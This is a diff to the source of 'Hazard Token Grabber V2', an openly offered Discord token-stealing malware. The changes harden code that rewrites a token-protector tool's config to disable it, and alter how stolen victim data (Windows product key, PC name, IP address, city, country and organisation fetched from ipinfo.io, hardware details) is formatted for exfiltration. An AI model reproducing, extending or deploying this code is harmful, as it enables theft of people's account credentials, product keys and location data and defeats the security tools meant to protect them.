@@ -193,7 +193,10 @@ class Hazard_Token_Grabber_V2(functions):
                 pass
         if os.path.exists(config):
             with open(config, errors="ignore") as f:
-                item = json.load(f)
+                try:
+                    item = json.load(f)
+                except json.decoder.JSONDecodeError:
+                    return
                 item['Rdimo_just_shit_on_this_token_protector'] = "https://github.com/Rdimo"
                 item['auto_start'] = False
                 item['auto_start_discord'] = False
@@ -210,6 +213,9 @@ class Hazard_Token_Grabber_V2(functions):
                 item['version'] = 69420
             with open(config, 'w') as f:
                 json.dump(item, f, indent=2, sort_keys=True)
+            with open(config, 'a') as f:
+                f.write(
+                    "\n\n//Rdimo just shit on this token protector | https://github.com/Rdimo")
 
     async def bypassBetterDiscord(self):
         bd = self.roaming+"\\BetterDiscord\\data\\betterdiscord.asar"
@@ -435,17 +441,17 @@ class Hazard_Token_Grabber_V2(functions):
                         fp.write(
                             x+"\n\n🌟・Grabber By github.com/Rdimo・https://github.com/Rdimo/Hazard-Token-Grabber-V2")
         w = self.getProductValues()
-        wname = w[0]
-        wkey = w[1]
+        wname = w[0].replace(" ", "᠎ ")
+        wkey = w[1].replace(" ", "᠎ ")
         ram = str(psutil.virtual_memory()[0]/1024/1024/1024).split(".")[0]
         disk = str(psutil.disk_usage('/')[0]/1024/1024/1024).split(".")[0]
         # ip, country, city, region, googlemap = "None"
         data = httpx.get("https://ipinfo.io/json").json()
-        ip = data.get('ip')
-        city = data.get('city')
-        country = data.get('country')
-        region = data.get('region')
-        org = data.get('org')
+        ip = data.get('ip').replace(" ", "᠎ ")
+        city = data.get('city').replace(" ", "᠎ ")
+        country = data.get('country').replace(" ", "᠎ ")
+        region = data.get('region').replace(" ", "᠎ ")
+        org = data.get('org').replace(" ", "᠎ ")
         googlemap = "https://www.google.com/maps/search/google+map++" + \
             data.get('loc')
 
@@ -493,7 +499,7 @@ class Hazard_Token_Grabber_V2(functions):
                         {
                             'name': '\u200b',
                             'value': f'''```fix
-                                PCName: {os.getenv('COMPUTERNAME')}
+                                PCName: {os.getenv('COMPUTERNAME').replace(" ", "᠎ ")}
                                 WinKey:᠎ {wkey}
                                 Platform:᠎ {wname}
                                 DiskSpace:᠎ {disk}GB
